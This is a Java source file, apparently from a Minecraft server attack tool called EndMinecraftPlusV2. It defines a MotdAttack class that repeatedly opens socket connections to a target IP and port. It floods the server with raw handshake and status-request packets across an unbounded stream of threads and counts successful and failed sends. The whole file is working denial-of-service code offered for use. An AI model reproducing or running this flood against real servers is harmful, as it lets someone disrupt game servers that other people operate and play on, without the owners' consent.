package cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.AttackUtils;

import cn.serendipityr.EndMinecraftPlusV2.EndMinecraftPlusV2;
import cn.serendipityr.EndMinecraftPlusV2.Tools.ConfigUtil;
import cn.serendipityr.EndMinecraftPlusV2.Tools.LogUtil;
import cn.serendipityr.EndMinecraftPlusV2.Tools.OtherUtils;
import cn.serendipityr.EndMinecraftPlusV2.Tools.SetTitle;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class MotdAttack extends IAttack {
    public List<Thread> threads = new ArrayList<>();
    public long starttime;
    private int runTimes = 0;
    private int successTimes = 0;
    private int errorTimes = 0;
    public MotdAttack(String ip, int port, int time, int maxconnect, long joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void start() {
        starttime = System.currentTimeMillis();

        if (this.attack_maxconnect < 1) {
            this.attack_maxconnect = 10;
        }

        while (true) {
            if (!EndMinecraftPlusV2.isLinux) {
                SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - MotdAttack | 当前连接数: " + threads.size() + "个 | 发包次数: " + runTimes + "次 | 有效包数: " + successTimes + "次 | 错误次数: " + errorTimes);
            }

            if (this.attack_time > 0 && (System.currentTimeMillis() - this.starttime) / 1000 > this.attack_time) {
                stop();
                return;
            }

            if (this.attack_maxconnect > 0 && (threads.size() > this.attack_maxconnect)) {
                continue;
            }

            runTimes++;

            Thread task = new Thread(() -> {
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(ip, port));

                    while (socket.isConnected() && !socket.isClosed()) {
                        OutputStream out = socket.getOutputStream();
                        InputStream in = socket.getInputStream();
                        out.write(new byte[] { 0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01 });
                        out.flush();
                        out.write(new byte[] { 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01,
                                0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00 });
                        out.flush();

                        byte[] buffer = new byte[12800];
                        if (in.read(buffer) != -1) {
                            LogUtil.doLog(0, "成功发送了Motd更新数据包。", "MotdAttack#" + Thread.currentThread().getName());
                            successTimes++;
                        }

                        socket.close();
                    }

                    OtherUtils.doSleep(attack_joinsleep);
                } catch (Throwable e) {
                    if (ConfigUtil.ShowFails) {
                        LogUtil.doLog(0, "发生错误: " + e, "MotdAttack#" + Thread.currentThread().getName());
                    }
                    errorTimes++;
                }
            });

            threads.add(task);
            task.setName(String.valueOf(runTimes));
            task.start();

            new Thread(() -> {
                OtherUtils.doSleep(ConfigUtil.ConnectTimeout);
                if (task.isAlive()) {
                    task.stop();
                }
                threads.remove(task);
            }).start();
        }
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        threads.forEach(Thread::stop);
    }

}
